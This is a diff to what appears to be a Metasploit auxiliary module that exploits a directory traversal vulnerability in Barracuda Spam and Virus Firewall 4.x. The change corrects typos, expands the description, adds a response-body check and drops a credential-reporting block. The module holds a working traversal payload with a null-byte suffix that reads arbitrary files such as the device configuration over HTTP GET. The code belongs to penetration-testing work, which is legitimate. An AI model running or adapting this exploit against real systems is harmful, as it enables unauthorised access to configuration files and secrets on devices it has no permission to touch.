@@ -19,11 +19,12 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'Barracuda Spam & Virus Firewall "locale" Directory Traversal Vulnerability',
+			'Name'           => 'Barracuda Spam / Virus Firewall "locale" Directory Traversal',
 			'Version'        => '$Revision$',
 			'Description'    => %q{
-					This module exploit a Directory Traversal vulnerability present in
-				Barracuda Spam & Virus Firewall 4.x
+					This module exploits a directory traversal vulnerability present in
+				Barracuda Spam and Virus Firewall version 4.x. By default, this module
+				will attempt to download the Barracuda configuration file.
 			},
 			'References'     =>
 				[
@@ -56,29 +57,18 @@ class Metasploit3 < Msf::Auxiliary
 		file = datastore['FILE']
 		payload = "?locale=/../../../../../../..#{file}%00"
 
-		print_status("#{target_url} - Barracuda - Checkig if remote server is vulnerable")
+		print_status("#{target_url} - Barracuda - Checking if remote server is vulnerable")
 
 		res = send_request_raw({
 			'method'  => 'GET',
 			'uri'     => "#{uri}" + payload,
 		}, 25)
 
-		if (res and res.code == 200)
+		if (res and res.code == 200 and res.body)
 			if (res.body.match(/p\>(.*)\<\/p/im).to_s.size > 10)
 				file_data = $1
 				print_good("#{target_url} - Barracuda - Vulnerable")
 				print_good("#{target_url} - Barracuda - File Output: \n" + file_data + "\r\n")
-
-				report_auth_info(
-					:host => rhost,
-					:port => rport,
-					:sname => 'http',
-					:data => file_data,
-					:proof => "WEBAPP=\"Apache Axis\", VHOST=#{vhost}",
-					:active => true
-				)
-
-				return :next
 
 			elsif res.body =~ /help_page/
 				print_error("#{target_url} - Barracuda - Not Vulnerable")
